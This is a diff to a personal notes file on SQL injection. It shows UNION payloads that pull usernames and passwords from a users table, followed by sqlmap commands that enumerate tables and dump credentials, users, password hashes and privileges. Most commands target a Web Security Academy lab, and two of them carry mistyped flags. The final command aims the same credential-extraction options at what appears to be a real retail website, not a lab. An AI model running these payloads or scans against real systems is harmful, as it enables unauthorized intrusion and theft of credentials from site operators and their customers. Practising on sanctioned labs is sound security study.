@@ -10,3 +10,16 @@ WHERE category='Gifts' UNION SELECT 'abc', 'abc' --';
 SELECT *
 FROM products
 WHERE category='Gifts' UNION SELECT username, password FROM users --';
+
+
+##Alguns comandos sqlmap para testes de vulnerabilidades com sqlinjection
+
+sqlmap -u https://0a4d00bf047dc04981bf99fb00e40096.web-security-academy.net/filter?category=Pets -D public --tables
+sqlmap -u https://0a4d00bf047dc04981bf99fb00e40096.web-security-academy.net/filter?category=Pets -D public -T users --columns
+sqlmap -u https://0a4d00bf047dc04981bf99fb00e40096.web-security-academy.net/filter?category=Pets -D public -T users --columns "password,username" --dump
+sqlmap -u https://0a4d00bf047dc04981bf99fb00e40096.web-security-academy.net/filter?category=Pets --current-user --is-dba --users --passwords --privileges
+sqlmap -u https://0a4d00bf047dc04981bf99fb00e40096.web-security-academy.net/filter?category=Pets --current-user --is-dba --users --passwords --privileges --batch --threads 5 --bdms PostgreSQL
+sqlmap -u https://0a4d00bf047dc04981bf99fb00e40096.web-security-academy.net/filter?category=Pets --current-user --is-dba --users --passwords --privileges --batch --threads 5 --bds PostgreSQL
+sqlmap -u https://0a4d00bf047dc04981bf99fb00e40096.web-security-academy.net/filter?category=Pets --current-user --is-dba --users --passwords --privileges --batch --threads 5 --dbms PostgreSQL
+sqlmap -u https://www.zattini.com.br/feminino/home?mi=ztt_mntop_feminino --current-user --is-dba --users --passwords --privileges --batch --threads 5 
+
